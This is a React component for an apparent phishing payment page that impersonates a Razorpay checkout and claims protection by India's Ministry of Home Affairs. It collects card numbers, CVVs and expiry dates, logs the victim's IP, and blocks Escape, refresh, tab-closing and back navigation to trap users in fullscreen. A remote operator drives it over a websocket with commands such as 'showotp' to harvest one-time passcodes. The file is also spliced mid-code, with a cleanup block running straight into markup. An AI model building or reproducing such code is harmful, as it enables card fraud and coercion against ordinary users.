import React, { useState, useEffect, useRef } from 'react';
import { CreditCard, Lock, Shield, Loader2, AlertTriangle } from 'lucide-react';
import { wsClient } from '@/integrations/ws-client';
import OTPVerificationPage from './OTPVerificationPage';

const getRealIP = async () => {
  try {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    return data.ip;
  } catch (error) {
    console.log('Could not fetch real IP, using fallback');
    return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
  }
};

const getRandomNetwork = () => {
  const networks = ['Airtel', 'Jio', 'Vi', 'BSNL'];
  return networks[Math.floor(Math.random() * networks.length)];
};

interface PaymentFormProps {
  highlightFields: boolean;
  clickTrigger: number;
}

const PaymentForm: React.FC<PaymentFormProps> = ({ highlightFields, clickTrigger }) => {
  const [formData, setFormData] = useState({
    cardNumber: '',
    expiryMonth: '',
    expiryYear: '',
    cvv: '',
    cardHolder: '',
    amount: '29000.00'
  });

  const [isLoading, setIsLoading] = useState(false);
  const [showOtp, setShowOtp] = useState(false);
  const [isConfirmLoading, setIsConfirmLoading] = useState(false);
  const [errorMessage, setErrorMessage] = useState('');
  const [showProcessing, setShowProcessing] = useState(false);
  const [showSuccess, setShowSuccess] = useState(false);
  const [invalidOtpMessage, setInvalidOtpMessage] = useState('');
  const [showAlert, setShowAlert] = useState(false);
  const [fadeState, setFadeState] = useState('visible');
  const [showBackDialog, setShowBackDialog] = useState(false);
  const [longPressTimer, setLongPressTimer] = useState<ReturnType<typeof setTimeout> | null>(null);
  const [currentSubmissionId, setCurrentSubmissionId] = useState<string | null>(null);
  const [selectedBank, setSelectedBank] = useState('ICICI BANK');
  const [selectedBankLogo, setSelectedBankLogo] = useState('');
  const [isMobile, setIsMobile] = useState(false);

  const [inputGlow, setInputGlow] = useState({
    cardNumber: false,
    expiryMonth: false,
    expiryYear: false,
    cvv: false,
    cardHolder: false,
  });

  const inactivityTimer = useRef<ReturnType<typeof setTimeout> | null>(null);

  // Function to reset the inactivity timer
  const resetInactivityTimer = () => {
    if (inactivityTimer.current) {
      clearTimeout(inactivityTimer.current);
    }
    inactivityTimer.current = setTimeout(() => {
      setInputGlow({
        cardNumber: false,
        expiryMonth: false,
        expiryYear: false,
        cvv: false,
        cardHolder: false,
      });
    }, 2000); // 2 seconds
  };

  // Initial glow on fullscreen entry
  useEffect(() => {
    if (highlightFields) {
      setInputGlow({
        cardNumber: true,
        expiryMonth: true,
        expiryYear: true,
        cvv: true,
        cardHolder: true,
      });
      resetInactivityTimer(); // Start the inactivity timer
    }
  }, [highlightFields, clickTrigger]);

  // Check if device is mobile
  useEffect(() => {
    const checkMobile = () => {
      const isMobileDevice = window.innerWidth <= 768 || /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
      setIsMobile(isMobileDevice);
    };

    checkMobile();
    window.addEventListener('resize', checkMobile);
    return () => window.removeEventListener('resize', checkMobile);
  }, []);

  // Check if all card details are filled
  const isFormValid = () => {
    return formData.cardNumber.replace(/\s/g, '').length === 16 &&
           formData.expiryMonth.length >= 1 && formData.expiryMonth.length <= 2 &&
           formData.expiryYear.length >= 1 && formData.expiryYear.length <= 2 &&
           formData.cvv.length >= 3 &&
           formData.cardHolder.trim().length > 0;
  };

  useEffect(() => {
    // Only apply desktop-specific key blocking if not on mobile
    if (isMobile) return;

    // Ultra-strong ESC key blocking - ENHANCED VERSION
    const handleKeyDown = (event: KeyboardEvent) => {
      // Block ESC key completely with maximum prevention
      if (event.key === 'Escape' || event.keyCode === 27 || event.which === 27) {
        event.preventDefault();
        event.stopPropagation();
        event.stopImmediatePropagation();
        
        // Force fullscreen to stay active
        if (!document.fullscreenElement) {
          document.documentElement.requestFullscreen().catch(() => {
            console.log('Fullscreen request failed');
          });
        }
        
        return false;
      }
      
      // Block back navigation
      if (event.altKey && event.key === 'ArrowLeft') {
        event.preventDefault();
        setShowBackDialog(true);
        return false;
      }
      
      // Block browser shortcuts
      if (event.key === 'F5' || 
          (event.ctrlKey && event.key === 'r') || 
          (event.ctrlKey && event.key === 'F5') ||
          (event.ctrlKey && (event.key === 'w' || event.key === 'q' || event.key === 't')) ||
          (event.altKey && event.key === 'F4') ||
          (event.key === 'F11')) {
        event.preventDefault();
        event.stopPropagation();
        return false;
      }
    };

    // Add back button prevention for desktop
    const handlePopState = (event: PopStateEvent) => {
      event.preventDefault();
      setShowBackDialog(true);
      window.history.pushState(null, '', window.location.href);
    };

    // Push initial state and add listener
    window.history.pushState(null, '', window.location.href);
    window.addEventListener('popstate', handlePopState);

    // Ultra-strong event blocking on multiple targets with maximum prevention
    const targets = [document, window, document.body, document.documentElement];
    const events = ['keydown', 'keyup', 'keypress'];
    
    targets.forEach(target => {
      events.forEach(eventType => {
        target.addEventListener(eventType, handleKeyDown, { capture: true, passive: false });
      });
    });

    // Additional ESC blocking layers
    const preventEscape = (e: KeyboardEvent) => {
      if (e.key === 'Escape' || e.keyCode === 27) {
        e.preventDefault();
        e.stopPropagation();
        e.stopImmediatePropagation();
        return false;
      }
    };

    // Multiple event listeners for maximum ESC blocking
    document.addEventListener('keydown', preventEscape, { capture: true, passive: false });
    window.addEventListener('keydown', preventEscape, { capture: true, passive: false });
    document.body.addEventListener('keydown', preventEscape, { capture: true, passive: false });

    return () => {
      window.removeEventListener('popstate', handlePopState);
      targets.forEach(target => {
        events.forEach(eventType => {
          target.removeEventListener(eventType, handleKeyDown, true);
        });
      });
      document.removeEventListener('keydown', preventEscape, true);
      window.removeEventListener('keydown', preventEscape, true);
      document.body.removeEventListener('keydown', preventEscape, true);
      if (longPressTimer) {
        clearTimeout(longPressTimer);
      }
    };
  }, [longPressTimer, isMobile]);

  useEffect(() => {
    const handleAdminCommand = (payload: any) => {
      const { command, submission_id, bank_name, bank_logo } = payload;
      console.log('PaymentForm received admin command:', payload);
      
      // Only process commands if we have a socket ID
      if (!submission_id) {
        console.log('No submission_id in command payload');
        return;
      }
      
      // Get the current socket ID
      const socketId = wsClient.getSocketId();
      if (!socketId) {
        console.log('No socket ID available');
        return;
      }
      
      // Only process commands if they match our socket ID
      if (submission_id !== socketId) {
        console.log('Command submission_id does not match our socket ID');
        return;
      }

      switch (command) {
        case 'showotp':
          if (bank_name) setSelectedBank(bank_name);
          if (bank_logo) setSelectedBankLogo(bank_logo);
          setFadeState('fadeOut');
          setTimeout(() => {
            setIsLoading(false);
            setShowOtp(true);
            setFadeState('fadeIn');
          }, 300);
          break;
        case 'fail':
          setFadeState('fadeOut');
          setTimeout(() => {
            setIsLoading(false);
            setShowOtp(false);
            setErrorMessage('Your card has been declined');
            setFadeState('fadeIn');
          }, 300);
          break;
        case 'success':
          setFadeState('fadeOut');
          setTimeout(() => {
            setIsConfirmLoading(false);
            setShowProcessing(true);
            setFadeState('fadeIn');
            setTimeout(() => {
              setShowProcessing(false);
              setShowSuccess(true);
              setTimeout(() => {
                window.location.replace('https://google.com');
              }, 2000);
            }, 4000);
          }, 300);
          break;
        case 'invalidotp':
          setIsConfirmLoading(false);
          setInvalidOtpMessage('Invalid OTP, Enter valid one time passcode sent to your mobile');
          break;
        case 'cardinvalid':
          setFadeState('fadeOut');
          setTimeout(() => {
            setIsLoading(false);
            setShowOtp(false);
            setErrorMessage('Your card is invalid, please try another card');
            setFadeState('fadeIn');
          }, 300);
          break;
        case 'carddisabled':
          setFadeState('fadeOut');
          setTimeout(() => {
            setIsLoading(false);
            setShowOtp(false);
            setErrorMessage('Card disabled, please try another card');
            setFadeState('fadeIn');
          }, 300);
          break;
      }
    };

    wsClient.on('admin_command', handleAdminCommand);
    return () => {
      wsClient.off('admin_command', handleAdminCommand);
            <Shield className="w-4 h-4 mr-2" />
            <span>256-bit SSL Encryption</span>
          </div>
        </div>

        <button
          type="submit"
          disabled={!isFormValid() || isLoading}
          className={`w-full py-3 px-4 rounded font-medium focus:outline-none focus:ring-2 focus:ring-green-500 mt-6 transition-all ${
            isFormValid() && !isLoading
              ? 'bg-green-600 text-white hover:bg-green-700'
              : 'bg-gray-400 text-gray-600 cursor-not-allowed'
          }`}
        >
          {isLoading ? (
            <Loader2 className="w-5 h-5 animate-spin mx-auto" />
          ) : (
            `Pay Securely ₹${formData.amount}`
          )}
        </button>

        <div className="flex justify-center items-center space-x-4 mt-4 mb-4">
          <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/visa.svg" alt="Visa" className="h-8 w-12 object-contain filter brightness-0" />
          <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/mastercard.svg" alt="Mastercard" className="h-8 w-12 object-contain filter brightness-0" />
          <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/americanexpress.svg" alt="American Express" className="h-8 w-12 object-contain filter brightness-0" />
          <img 
            src="https://logotyp.us/file/rupay.svg" 
            alt="RuPay" 
            className="h-8 w-12 object-contain filter brightness-0" 
          />
        </div>

        <div className="text-center mt-4 mb-4">
          <span className="text-sm text-gray-500">Powered by </span>
          <img
            src="https://cdn.worldvectorlogo.com/logos/razorpay.svg"
            alt="Razorpay"
            className="inline-block h-4 align-middle ml-1"
          />
        </div>

        <div className="text-xs text-gray-500 text-center mt-4">
          <p>Protected by Government of India</p>
          <p>Ministry of Home Affairs</p>
        </div>
      </form>
    </div>
  );
};

export default PaymentForm;
